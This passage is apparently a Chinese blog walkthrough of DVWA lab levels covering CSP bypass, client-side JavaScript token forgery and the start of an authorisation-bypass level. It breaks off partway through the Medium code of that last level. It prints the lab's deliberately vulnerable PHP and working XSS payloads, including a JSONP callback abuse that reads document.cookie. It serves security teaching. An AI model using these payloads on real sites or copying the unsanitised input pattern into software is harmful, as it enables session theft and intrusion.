
<span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span>

<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span>
<span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span>
<span class="hljs-string">&quot;</span>;
&#125;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span>
<span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span>
<span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span>
<span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span>
<span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&#x27;</span>;</code></pre>
<ol>
<li><strong>script-src ‘self’</strong>: 指定允许执行 JavaScript 代码的来源。在这里，<code>'self'</code> 表示只允许从同一域名加载脚本。</li>
<li><strong>‘unsafe-inline’</strong>: 允许内联脚本的执行，即在 HTML 中直接嵌入的脚本。</li>
<li><strong>‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</strong>: 使用 nonce（一次性随机值）来标识允许执行的脚本。在这里，指定了一个特定的 nonce 值。只有包含这个 nonce 的脚本才会被执行。</li>
</ol>
<p>由于这一关允许内联脚本执行，因此我们直接构造XSS即可，但要注意需要包含上述指定的nonce值</p>
<pre><code class="hljs scss">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113154138486.png" alt="image-20240113154138486"></p>
<p>之后直接输入文本框提交即可</p>
<h2 id="High-13">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span>
<span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span>
<span class="hljs-string">&quot;</span>;
&#125;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span>
<span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span>
<span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span>
<span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span>
<span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string"></span>
<span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span>
<span class="hljs-string">&#x27;</span>;</code></pre>
<p>这里做出了严格的限制，只允许加载来自自身网站的js脚本，但好在页面中有如下提示</p>
<pre><code class="hljs scss">The page makes <span class="hljs-selector-tag">a</span> call to ../..<span class="hljs-comment">//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</span></code></pre>
<p>说这个网站页面会加载<code>vulnerabilities/csp/source/jsonp.php</code>下的php的代码，对应内容如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;callback&quot;</span>, <span class="hljs-variable">$_GET</span>)) &#123;
	<span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];
&#125; <span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;
&#125;

<span class="hljs-variable">$outp</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&quot;answer&quot;</span> =&gt; <span class="hljs-string">&quot;15&quot;</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&quot;(&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$outp</span>).<span class="hljs-string">&quot;)&quot;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>判断变量callback是否存在与get传参中，如果存在的话，则会与js解码出来的数据一同拼接输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160033855.png" alt="image-20240113160033855"></p>
<p>同时页面代码还存在自动加载high.js文件，我们追踪看看</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> s = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);
    s.src = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;
    document.body.<span class="hljs-title function_ invoke__">appendChild</span>(s);
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;
	<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> in obj) &#123;
		document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];
	&#125;
&#125;
<span class="hljs-keyword">var</span> solve_button = document.<span class="hljs-title function_ invoke__">getElementById</span> (<span class="hljs-string">&quot;solve&quot;</span>);

<span class="hljs-keyword">if</span> (solve_button) &#123;
	solve_button.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, function() &#123;
		<span class="hljs-title function_ invoke__">clickButton</span>();
	&#125;);
&#125;</code></pre>
<p>这里表名，当我们点击id为solve的元素之后，便会调用clickButton函数，solve位置如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160344909.png" alt="image-20240113160344909"></p>
<p>该函数会创建一个script标签：</p>
<pre><code class="hljs scss">&lt;script <span class="hljs-attribute">src</span>=&quot;http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum<span class="hljs-string">&quot;&gt;&lt;/script&gt;</span></code></pre>
<p>这个时候浏览器就会发起如下请求：</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code></pre>
<p>访问这个 jsonp.php 会得到如下请求：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161028991.png" alt="image-20240113161028991"></p>
<p>如果我们将callback改为alert之类的，就会触发弹窗，那接下来就是想办法如何修改callback参数了</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span>
<span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span>
<span class="hljs-string">&quot;</span>;
&#125;</code></pre>
<p>幸运的是这里留了一个include参数，并且该参数内容会直接插入body中，我们直接利用即可，但这里并不是直接插入script标签，因为没有unsafe_inline，因此并不会当做脚本执行。构造如下：</p>
<pre><code class="hljs scss">include=&lt;script <span class="hljs-attribute">src</span>=source/jsonp<span class="hljs-selector-class">.php</span>?callback=<span class="hljs-built_in">alert</span>(document.cookie)&gt;&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161238449.png" alt="image-20240113161238449"></p>
<p>这里加载jsonp.php的代码，并修改callback参数即可成功弹窗</p>
<h2 id="Impossible-13">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span>
<span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span>
<span class="hljs-string">&quot;</span>;
&#125;
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span>
<span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span>
<span class="hljs-string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span>
<span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span>
<span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string"></span>
<span class="hljs-string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span>
<span class="hljs-string">&#x27;</span>;</code></pre>
<p>这里主要是下面文件发生了改动：jsonp_impossible.php：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);
<span class="hljs-variable">$outp</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&quot;answer&quot;</span> =&gt; <span class="hljs-string">&quot;15&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;solveSum (&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$outp</span>).<span class="hljs-string">&quot;)&quot;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里指定了只能输出 solveSum，这里也就写死了，没法绕过</p>
<h1>0x14 JS Attacks</h1>
<h2 id="Low-14">Low</h2>
<pre><code class="hljs js">&lt;?php
$page[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF
&lt;script&gt;
/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/
!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d&#125;

    function rot13(inp) &#123;
        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);
    &#125;

    function generate_token() &#123;
        var phrase = document.getElementById(&quot;phrase&quot;).value;
        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));
    &#125;

    generate_token();
&lt;/script&gt;
EOF;
?&gt;</code></pre>
<p>可以到上述代码主要是用来生成一个token，大概逻辑看看我们可以知道，上述代码会在前端html找一个id名为phrase的元素，随后拿到其value值，接着按该值生成独属于其的token。元素位置如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113162311368.png" alt="image-20240113162311368"></p>
<p>而这里倘若我们直接将其修改为success，会发现页面说我们是一个无效的token，这是因为我们采用的是ChangeMe的token，因此我们需要想办法拿到success生成的token，幸运的是这在前端就生成了，我们只需要改一下phrase的值，在前端运行一下即可</p>
<p>这里在开发者工具中找到对应的js代码地址，在生成token函数的地方下一个断点，接着刷新页面运行，之后会在右侧出现phrase，接着修改其值为success，之后继续运行，会发现，token发生了变化。这时我们直接修改为success提交，会发现提交成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163247276.png" alt="image-20240113163247276"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163341621.png" alt="image-20240113163341621"></p>
<h2 id="Medium-14">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们跟踪medium.js：</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_something</span>(<span class="hljs-params">e</span>)</span>&#123;
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;&quot;</span>,n=e.length-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];
    <span class="hljs-keyword">return</span> t
&#125;
<span class="hljs-title function_ invoke__">setTimeout</span>(function()&#123;
    <span class="hljs-title function_ invoke__">do_elsesomething</span>(<span class="hljs-string">&quot;XX&quot;</span>)&#125;,<span class="hljs-number">300</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_elsesomething</span>(<span class="hljs-params">e</span>)</span>&#123; 						document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).value=<span class="hljs-title function_ invoke__">do_something</span>(e+document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).value+<span class="hljs-string">&quot;XX&quot;</span>)
&#125;</code></pre>
<p>这里看了一下逻辑，发现其会取token的值为xx+id名为phrase的值+xx，接着传给do_something函数，该函数将传入的参数倒序输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164139019.png" alt="image-20240113164139019"></p>
<p>我们看到上述的token值为XXeMegnahCXX，这意味着我们只需要将其改为XXsseccusXX即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164255199.png" alt="image-20240113164255199"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164240377.png" alt="image-20240113164240377"></p>
<p>可以看到成功修改</p>
<h2 id="High-14">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs scss"><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span>=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;fromCharCode&#x27;</span>,<span class="hljs-string">&#x27;toString&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;BeJ&#x27;</span>,<span class="hljs-string">&#x27;\x5cw+&#x27;</span>,<span class="hljs-string">&#x27;Lyg&#x27;</span>,<span class="hljs-string">&#x27;SuR&#x27;</span>,<span class="hljs-string">&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N).........!&#x27;</span><span class="hljs-string">&#x27;[b(&#x27;</span>0x2<span class="hljs-string">&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;</span>wpA<span class="hljs-string">&#x27;!==b(&#x27;</span>0x3<span class="hljs-string">&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;</span>0x4<span class="hljs-string">&#x27;);&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b(&#x27;</span>0x4<span class="hljs-string">&#x27;);&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;</span>0x5<span class="hljs-string">&#x27;)===b(&#x27;</span>0x6<span class="hljs-string">&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;</span>0x2<span class="hljs-string">&#x27;)](new RegExp(&#x27;</span>\x5cb<span class="hljs-string">&#x27;+h(f)+&#x27;</span>\x5cb<span class="hljs-string">&#x27;,&#x27;</span>g<span class="hljs-string">&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;</span>0x7<span class="hljs-string">&#x27;),0x3e,0x137,b(&#x27;</span>0x8<span class="hljs-string">&#x27;)[b(&#x27;</span>0x9<span class="hljs-string">&#x27;)](&#x27;</span>|<span class="hljs-string">&#x27;),0x0,&#123;&#125;));</span></span></code></pre>
<p>这里的代码是被混淆了，我们用在线网站解密一下：<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p>
<p>重点代码在后面：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];
    <span class="hljs-keyword">return</span> t
&#125;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)
&#125;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)
&#125;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)
&#125;
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;
    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)
&#125;, <span class="hljs-number">300</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);
<span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);</code></pre>
<p>这里首先将phrase的value赋值为空，接着调用<code>token_part_1</code>函数，将phrase的值倒序输出，随后延迟300s调用token_part_2函数，YY经过sha加密，赋值给token的value，然后当我们点击submit按钮时，调用token_part_3函数将token值拼接ZZ接着经过sha加密，赋值给token的value</p>
<p>这里可以看到我们输入的success，与这些代码根本无关，因为其phrase的值始终被设置为0，我们进F12调试看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113165956794.png" alt="image-20240113165956794"></p>
<p>我们在右侧下个对于鼠标click的断点，接着我们点击上面的文本框，会发现我们成功进入断点调试，接着一直按运行键，会发现左侧出现了我们之前解混淆的js代码，接着我们对part1函数下断点，同时取消对click的断点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170103903.png" alt="image-20240113170103903"></p>
<p>然后去控制台设置phrase的值为success，按下图所示。接着回车一下，随后放行，会发现在输入框中出现succes，接着我们点击submit按钮发送即可发现成功修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170302051.png" alt="image-20240113170302051"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113170500908.png" alt="image-20240113170500908"></p>
<h2 id="Impossible-14">Impossible</h2>
<p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p>
<p>直接把用户输入的地方关了，这无从下手了。。。。。</p>
<h1>0x15 Authorisation Bypass</h1>
<p>This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example <em>gordonb</em> / <em>abc123</em>.</p>
<p>这意味着这是一个未授权访问的漏洞，我们的目标是以gordonb这一低级别用户访问管理员才可以访问的页面</p>
<h2 id="Low-15">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">Nothing to see here for this vulnerability, have a look</span>
<span class="hljs-comment">instead at the dvwaHtmlEcho function in:</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">* dvwa/includes/dvwaPage.inc.php</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">*/</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可见这里没有任何限制，是存在未授权访问的，让我们先以低级别用户登录看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180442459.png" alt="image-20240113180442459"></p>
<p>如上图，可以看到我们当前用户是没有权限访问到刚才的页面的，接下来我们尝试抓包，看一下刚刚管理员页面的url地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113180617876.png" alt="image-20240113180617876"></p>
<p>如上图，接下来让我们尝试直接访问该url地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113181023564.png" alt="image-20240113181023564"></p>
<p>可以看到成功未授权</p>
<h2 id="Medium-15">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">Only the admin user is allowed to access this page.</span>
